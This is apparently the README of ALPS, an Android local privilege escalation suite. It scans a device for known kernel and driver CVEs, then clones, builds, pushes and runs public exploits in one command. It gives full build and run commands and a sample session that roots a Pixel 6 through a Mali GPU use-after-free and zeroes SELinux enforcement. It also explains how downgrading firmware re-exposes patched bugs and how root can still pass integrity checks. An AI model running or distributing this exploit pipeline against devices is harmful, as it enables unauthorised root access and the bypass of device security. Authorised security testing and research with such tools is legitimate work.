# ALPS: Android LPE Suite

> Use only on devices you own or are authorized to test.

## What is this?

ALPS is a tool very similar to [portbuster1337/lpe-toolkit](https://github.com/portbuster1337/lpe-toolkit), but for Android. It automatically collects and evaluates all required data and state of your device against a list of known local privilege escalation (LPE) vulnerabilities and determines which ones apply to your device and have a public exploit. It then allows you to choose and compile the exploit for your device which you can then use to gain temporary root privileges while keeping the bootloader locked and passing `Play Integrity` and `Key Attestation`.

In essence, it performs the following:
* **Collect** device state (props, patch levels, GPU driver blob versions,
  verified-boot / rollback flags).
* **Match** every CVE rule against those facts through typed version
  comparators and a small predicate language.
* **Report** findings grouped by five verdicts, most-actionable first:

  | Verdict | Meaning |
  |---|---|
  | 🟢 available_now      | Currently exploitable; public exploit exists. |
  | 🟡 via_downgrade      | Exploit exists on an older SPL and the device is downgradable. |
  | 🔵 poc_needs_porting  | PoC exists but declared for a different device. |
  | ⚪ research_lead      | Applies here; no public PoC documented. |
  | 🔴 unreachable        | Patched, and downgrade is blocked. |

* **Run** the public PoC when the rule declares one and you invoke the
  runner explicitly. `alps exploit go <CVE> --i-am-authorized-to-test`
  runs prereq, fetch, build, deploy, run in one shot. Nothing is
  fetched or executed unless you invoke a state-changing verb.

The runner is host-side. ALPS itself does not vendor PoC source: the
rule pins an upstream commit; the runner clones it into
`~/.alps/workspace/<CVE>/`, builds it under the NDK, `adb push`es to a
sandbox path (`/data/local/tmp/alps-work/<CVE>/`), and executes. See
[docs/EXPLOIT.md](docs/EXPLOIT.md) for the schema and gate checklist.

## Quickstart: device build

The device-side build is `arm64-v8a`; the resulting binary is `adb
push`ed and run inside `adb shell`. The rule KB is embedded at build
time, so deployment is a single file.

```bash
cmake -B build/arm64 -G Ninja \
    -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK/build/cmake/android.toolchain.cmake \
    -DANDROID_ABI=arm64-v8a \
    -DANDROID_PLATFORM=android-26 \
    -DANDROID_STL=c++_static \
    -DCMAKE_BUILD_TYPE=Release
cmake --build build/arm64

adb push build/arm64/src/cli/alps /data/local/tmp/
adb shell 'chmod +x /data/local/tmp/alps && /data/local/tmp/alps scan'
```

For rule-KB development, `--rules <dir>` overrides the built-in KB with
YAML files on disk.

### Host build (needed to use the runner)

The runner shells out to `git`, `cmake`, and `adb`, all host tools.
On Linux, macOS, or WSL:

```bash
cmake -B build/host -G Ninja -DCMAKE_BUILD_TYPE=Release
cmake --build build/host
```

On Windows (Visual Studio 2022 Build Tools installed), the Android SDK
already bundles CMake, Ninja, ADB, and the NDK. From a Developer
PowerShell:

```powershell
$sdk  = "$env:LOCALAPPDATA\Android\Sdk"
$ndk  = Get-ChildItem "$sdk\ndk" | Sort-Object Name | Select-Object -Last 1
$cm   = Get-ChildItem "$sdk\cmake" | Sort-Object Name | Select-Object -Last 1
$env:ANDROID_NDK = $ndk.FullName
$env:PATH        = "$($cm.FullName)\bin;$sdk\platform-tools;$env:PATH"

# vcvars puts cl.exe on the path
& "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
cmake -B build\host -G Ninja -DCMAKE_BUILD_TYPE=Release
cmake --build build\host
```

The host build produces `alps.exe` under `build/host/src/cli/`. Collector
and TUI subcommands are disabled on Windows (they use POSIX headers); the
runner and all read-only subcommands work. On the device (arm64) binary,
every state-changing runner verb refuses with a message pointing here.

### End-to-end run against a connected device

Once you have both binaries (arm64 pushed to `/data/local/tmp/alps`, host
built at `build/host/src/cli/alps`), the full pipeline is a single verb.
The runner uses `--facts` to know the device's verdict; on Windows, run
`adb shell alps collect` first and trim the output to pure JSON.

```powershell
# 1. Collect device facts using the on-device binary.
adb shell /data/local/tmp/alps collect > device_facts.json
# (On Windows, adb wraps stdout in daemon banners; clip to the JSON:)
$c = Get-Content device_facts.json -Raw
$c.Substring($c.IndexOf('{'), $c.LastIndexOf('}') - $c.IndexOf('{') + 1) `
    | Set-Content device_facts.json -NoNewline

# 2. One-shot pipeline: prereq, fetch, build, deploy, run.
build\host\src\cli\alps.exe exploit go CVE-2022-38181 `
    --i-am-authorized-to-test --facts device_facts.json --cleanup-after
```

On Linux or macOS the equivalent:

```bash
adb shell /data/local/tmp/alps collect > device_facts.json
build/host/src/cli/alps exploit go CVE-2022-38181 \
    --i-am-authorized-to-test --facts device_facts.json --cleanup-after
```

Each stage streams progress to stderr; every action appends a JSONL
record to `~/.alps/audit.log` (`alps exploit audit` tails it). Cloned
source lives under `~/.alps/workspace/<CVE>/src`; build artifacts under
`build/`; files pulled from the device under `device_pulls/`.

Individual verbs work the same way when you want to inspect a stage:

```bash
alps exploit list                                        # runnable rules
alps exploit show    CVE-2022-38181                      # rule + gate status
alps exploit prereq  CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json --acknowledge
alps exploit fetch   CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json
alps exploit build   CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json
alps exploit deploy  CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json
alps exploit run     CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json
alps exploit cleanup CVE-2022-38181 --i-am-authorized-to-test \
                     --facts device_facts.json --local
```

## End-to-end example: fingerprint and root a Pixel 6

Illustrative session on a July-2022 SPL Pixel 6 (oriole), covering
`scan` -> `exploit list` -> `exploit go` for CVE-2022-38181 (Man Yue Mo's
Mali kbase UAF). Assumes both binaries already exist: the arm64-v8a
device build at `/data/local/tmp/alps`, and the host build at
`build/host/src/cli/alps`. Rule counts and IDs drift as the KB evolves.

### 1. Fingerprint the device

`alps scan` runs the collector, matches the built-in KB, and prints the
compact terminal report:

```
$ adb shell /data/local/tmp/alps collect > device_facts.json
$ adb shell /data/local/tmp/alps scan

ALPS report. Use only on devices you own or are authorized to test.

Google Pixel 6 (oriole)  ·  Android 12  ·  SPL 2022-07-05
mali r32p1 (Valhall)  ·  kernel 5.10.81-android12-9  ·  locked/green  ·  SELinux enforcing

Summary: 🟢 4   🟡 5   🔵 3   ⚪ 1   🔴 0

🟢  AVAILABLE NOW  (4)   download, compile, run

   CVE-2022-38181  Arm Mali GPU kernel driver (kbase) use-after-free
                   weaponized_public · kernel_rw · targets oriole ✓
   CVE-2022-46395  Arm Mali GPU kernel driver use-after-free (Bifrost / Valhall / Avalon)
                   poc · kernel_rw · targets oriole ✓
   CVE-2024-36971  Linux kernel route/neighbour subsystem use-after-free (in-the-wild)
                   weaponized_public · root · portable PoC
   CVE-2024-53103  Linux kernel HFSC qdisc use-after-free
                   poc · root · portable PoC

🟡  REACHABLE VIA DOWNGRADE  (5)   flash older firmware to re-expose

   CVE-2022-0847   Linux kernel PIPE_BUF_FLAG_CAN_MERGE data corruption (Dirty Pipe)
                   weaponized_public · root · downgrade to SPL < 2022-05-05 (no blockers)
   CVE-2016-5195   Linux kernel mm/gup.c copy-on-write race ("Dirty COW")
                   weaponized_public · root · downgrade to SPL < 2016-12-05 (no blockers)
   CVE-2019-2215   Android Binder driver use-after-free ("Bad Binder")
                   weaponized_public · root · downgrade to SPL < 2020-02-05 (no blockers)
   CVE-2022-20186  Arm Mali KBASE_IOCTL_MEM_ALIAS heap out-of-bounds
                   poc · kernel_rw · downgrade to SPL < 2022-05-05 (no blockers)
   CVE-2022-25636  Linux kernel nf_tables offload path out-of-bounds write
                   weaponized_public · root · downgrade to SPL < 2022-05-05 (no blockers)

🔵  PoC NEEDS PORTING  (3)   public exploit exists for a different device

   CVE-2023-4211   Arm Mali GPU kernel driver use-after-free (in-the-wild)
                   weaponized_public · kernel_rw · port from panther, cheetah, husky, shiba
   CVE-2023-6241   Arm Mali GPU kernel driver JIT use-after-free (MTE-bypass PoC)
                   poc · kernel_rw · port from shiba, husky
   CVE-2025-0072   Arm Mali GPU driver use-after-free (Valhall / 5th-Gen, MTE bypass)
                   poc · kernel_rw · port from shiba, husky

⚪  RESEARCH LEAD  (1)   CVE applies, no public PoC documented

   CVE-2022-20411  Bluetooth stack elevation-of-privilege (AOSP)
                   cve_no_poc · root · matches spl 2022-07-05 in [0, 2022-10-05)

🔴  UNREACHABLE  (0)   patched here and downgrade is blocked

   (none)

Run with -v / --verbose for full reasoning, matched facts, and references.
```

### 2. Confirm the rule is runnable on this device

```
$ build/host/src/cli/alps exploit list --facts device_facts.json
(using built-in KB: 16 rule(s))
runnable  CVE-2022-38181  · Arm Mali GPU kernel driver (kbase) use-after-free
runnable  CVE-2022-46395  · Arm Mali GPU kernel driver use-after-free (Bifrost / Valhall / Avalon)
gated     CVE-2022-0847   · Linux kernel PIPE_BUF_FLAG_CAN_MERGE data corruption (Dirty Pipe)
                            (verdict is via_downgrade)
```

`runnable` = every gate would pass right now. `gated` = the rule fires
via `via_downgrade` so the runner refuses fetch/build/deploy without
`--force-downgrade-path` (rolling the device back is a prerequisite the
schema won't hide).

### 3. One-shot pipeline: prereq -> fetch -> build -> deploy -> run

```
$ build/host/src/cli/alps exploit go CVE-2022-38181 \
      --i-am-authorized-to-test --facts device_facts.json --cleanup-after
(using built-in KB: 16 rule(s))
[···] go     one-shot pipeline: prereq -> fetch -> build -> deploy -> run -> cleanup
[···] go     === stage: prereq ===
[···] prereq checking 6 prerequisite(s)
[···] prereq Android NDK toolchain (>= r25) ...
[  ✓] prereq $ANDROID_NDK -> /opt/android-ndk-r26b
[···] prereq host command `git` ...
[  ✓] prereq on PATH
[···] prereq host command `cmake` ...
[  ✓] prereq on PATH
[···] prereq `adb` on PATH ...
[  ✓] prereq device 1B171FDF60034A
[···] prereq pull /vendor/lib64/egl/libGLES_mali.so from device ...
[  →] prereq adb pull /vendor/lib64/egl/libGLES_mali.so -> ~/.alps/workspace/CVE-2022-38181/device_pulls/libGLES_mali.so
[  ✓] prereq pulled 33429776 bytes
[···] prereq manual: Device is a Pixel 6 (oriole) with SPL <= 2022-10-05 ...
[  ✓] prereq acknowledged
[···] go     === stage: fetch ===
[···] fetch  cloning https://github.com/github/securitylab @ c63e6adecf
[  →] fetch  git clone (sparse, no-checkout) (10%)
[  →] fetch  git sparse-checkout set SecurityExploits/Android/Mali/CVE_2022_38181 (40%)
[  →] fetch  git checkout c63e6adecf (55%)
[  ✓] fetch  workspace: ~/.alps/workspace/CVE-2022-38181/src
[···] go     === stage: build ===
[···] build  $ ANDROID_NDK=... ANDROID_ABI=arm64-v8a ... aarch64-linux-android30-clang -DSHELL mali_shrinker_mmap.c -o mali_shrinker_mmap
[  →] build  compiling (25%)
[  ✓] build  built into ~/.alps/workspace/CVE-2022-38181/build
[···] go     === stage: deploy ===
[  →] deploy mkdir /data/local/tmp/alps-work/CVE-2022-38181/ (10%)
[  →] deploy adb push .../build/mali_shrinker_mmap -> /data/local/tmp/alps-work/CVE-2022-38181/ (80%)
[  ✓] deploy deployed to /data/local/tmp/alps-work/CVE-2022-38181/
[···] go     === stage: run ===
[···] run    adb shell 'cd /data/local/tmp/alps-work/CVE-2022-38181/ && ./mali_shrinker_mmap; echo __ALPS_EXIT__=$?'
[  →] run    invoking on device (20%)
[···] run    ... PoC narration streamed here (leak, spray, cred overwrite) ...
[···] run    uid=0
[  ✓] run    entry exited 0
[···] go     === stage: cleanup ===
[···] cleanup rm -rf /data/local/tmp/alps-work/CVE-2022-38181/
[  ✓] cleanup cleaned
[  ✓] go     pipeline complete (5/5 stages) + cleanup
```

### 4. Confirm root and disabled SELinux from the shell

```
$ adb shell id
uid=0(root) gid=0(root) groups=0(root) context=u:r:shell:s0
$ adb shell getenforce
Couldn't get enforcing status
```

The shell process is uid=0, and the kernel refuses to report SELinux
enforcement state — the standard sign that the PoC zeroed
`selinux_enforcing` in place. `--cleanup-after` wiped the on-device
workspace; nothing but the in-kernel state change persists, and a
reboot restores the device to its normal locked/verified state.

### Other runnable rules in this KB

* **CVE-2022-46395**: same repo, same author. Fetches, builds, and
  deploys cleanly on this device but the upstream PoC's offset table
  was tuned for Nov-2022 / Jan-2023 SPL builds and refuses at run time
  with *"mali_user_buf: unable to match build id"* — a clean upstream
  failure surfaced verbatim by the runner.
* **CVE-2022-0847 (Dirty Pipe)**: `polygraphene/DirtyPipe-Android`,
  pinned to the narrow SPL window [2022-02-05, 2022-04-05]. Runnable
  only inside that window; on any other SPL the PoC will crash and
  the device WILL reboot, which is why the manual prereq blocks
  execution until you acknowledge you're inside the window.

### Downgrade blockers: what's actually a blocker

`downgrade.blocked_by:` on each rule names conditions that stop a
firmware or SPL downgrade. Only one is real on modern Android:

* **`rollback_index`**: the anti-rollback fuse. Monotonic hardware
  state; no `fastboot` sequence undoes it. Every KB rule defaults to
  `blocked_by: [rollback_index]`.
* `bootloader_locked` and `verified_boot_state` are recognised for
  backwards-compat but **do not model real blockers**. A user with
  physical access can `fastboot flashing unlock`, flash an older
  factory image, and re-`lock`. The KB does not include them.

## Subcommands

```
alps scan          Collect facts on this device, match rules, and print a report.
alps collect       Collect device facts and emit device_facts.json.
alps match         Match rules against a previously-collected device_facts.json.
alps report        Format existing findings JSON (terminal | markdown | json).
alps ui            Interactive two-pane browser (findings + runner).
alps rules         lint | list                Rule KB operations.
alps update        Import OSV Android ecosystem data into rule YAML.
alps exploit       list | show | prereq | fetch | build | deploy | run |
                   cleanup | go | audit      Runner (docs/EXPLOIT.md).
```

Every stage is decoupled: the engine runs fully offline against a
`device_facts.json` produced anywhere. The JNI target (`liballps.so`,
`-DALPS_BUILD_JNI=ON`) reuses the same static libraries. The rule KB is
embedded into both targets at build time (see
[`cmake/GenerateBuiltinRules.cmake`](cmake/GenerateBuiltinRules.cmake)).

## License

MIT: see [LICENSE](LICENSE). Third-party libraries:

* [nlohmann/json](https://github.com/nlohmann/json): MIT
* [yaml-cpp](https://github.com/jbeder/yaml-cpp): MIT
* [CLI11](https://github.com/CLIUtils/CLI11): BSD-3-Clause
